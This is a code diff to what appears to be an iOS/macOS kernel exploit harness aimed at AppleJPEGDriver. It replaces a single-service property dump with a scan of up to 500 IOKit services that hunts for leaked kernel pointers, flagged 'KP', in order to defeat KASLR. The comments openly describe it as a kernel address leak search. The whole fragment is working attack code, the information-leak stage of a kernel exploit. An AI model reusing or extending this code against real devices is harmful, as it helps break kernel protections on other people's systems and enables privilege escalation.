@@ -400,46 +400,60 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         uint32_t dstID = IOSurfaceGetID(dstSurf);
 
         // ========================================================
-        // PHASE 1: Try non-driver KASLR leak vectors
-        // All selectors return BadArgument/NotReady/zero output.
-        // Try IORegistry properties, IOSurface properties, mach primitives.
+        // PHASE 1: Scan ALL IOKit services for kernel pointers
+        // AppleJPEGDriver properties were all boolean flags.
+        // Broader scan — some service somewhere will leak an address.
         // ========================================================
         [self log:@""];
-        [self log:@"--- Phase 1: Non-driver KASLR leak vectors ---"];
+        [self log:@"--- Phase 1: IOKit-wide kernel pointer scan ---"];
 
-        kern_return_t kr;
-
-        // 1a: Dump IORegistry properties of the JPEG service
         {
-            CFMutableDictionaryRef props = NULL;
-            kr = IORegistryEntryCreateCFProperties(svc, &props,
-                kCFAllocatorDefault, 0);
-            [self log:@"IORegistry props: kr=0x%x, dict=%s",
-                kr, props ? "YES" : "NO"];
-            if (props) {
-                NSDictionary *pd = (__bridge_transfer NSDictionary *)props;
-                [self log:@"  %lu entries", (unsigned long)pd.count];
-                for (NSString *key in pd) {
-                    id val = pd[key];
-                    if ([val isKindOfClass:[NSNumber class]]) {
-                        int64_t v = [(NSNumber *)val longLongValue];
-                        if (v != 0) {
-                            uint64_t uv = (uint64_t)v;
-                            uint64_t hi = uv >> 40;
-                            [self log:@"  %@ = 0x%016llx%s", key, uv,
-                                (hi == 0xfffffe || hi == 0xffffff) ? " *** KP" : ""];
-                        }
-                    } else if ([val isKindOfClass:[NSData class]]) {
-                        NSData *d = (NSData *)val;
-                        if (d.length >= 8) {
-                            uint64_t uv = *(uint64_t *)d.bytes;
-                            uint64_t hi = uv >> 40;
-                            if (hi == 0xfffffe || hi == 0xffffff)
-                                [self log:@"  %@ = data[%lu] 0x%016llx *** KP",
-                                    key, (unsigned long)d.length, uv];
+            CFMutableDictionaryRef match = IOServiceMatching("IOService");
+            io_iterator_t iter = 0;
+            kern_return_t kr = IOServiceGetMatchingServices(
+                kIOMainPortDefault, match, &iter);
+            [self log:@"Service scan start: kr=0x%x", kr];
+
+            if (kr == KERN_SUCCESS && iter) {
+                io_object_t svc2;
+                int scanned = 0, hits = 0;
+                while ((svc2 = IOIteratorNext(iter)) && scanned < 500) {
+                    CFMutableDictionaryRef props = NULL;
+                    if (IORegistryEntryCreateCFProperties(svc2, &props,
+                            kCFAllocatorDefault, 0) == KERN_SUCCESS && props) {
+                        NSDictionary *pd = (__bridge_transfer NSDictionary *)props;
+                        NSString *className = pd[(id)@"IOClass"];
+                        // Scan values for kernel-like pointers
+                        BOOL found = NO;
+                        for (NSString *key in pd) {
+                            id val = pd[key];
+                            uint64_t uv = 0;
+                            if ([val isKindOfClass:[NSNumber class]]) {
+                                uv = (uint64_t)[(NSNumber *)val longLongValue];
+                            } else if ([val isKindOfClass:[NSData class]]
+                                       && ((NSData *)val).length >= 8) {
+                                uv = *(uint64_t *)((NSData *)val).bytes;
+                            }
+                            if (uv != 0) {
+                                uint64_t hi = uv >> 40;
+                                if (hi == 0xfffffe || hi == 0xffffff) {
+                                    if (!found) {
+                                        [self log:@"[%d] %@:", scanned,
+                                            className ?: @"?"];
+                                        found = YES;
+                                    }
+                                    [self log:@"  %@ = 0x%016llx *** KP", key, uv];
+                                    hits++;
+                                }
+                            }
                         }
                     }
+                    IOObjectRelease(svc2);
+                    scanned++;
                 }
+                IOObjectRelease(iter);
+                [self log:@"Scan done: %d services, %d kernel ptrs found",
+                    scanned, hits];
             }
         }
 
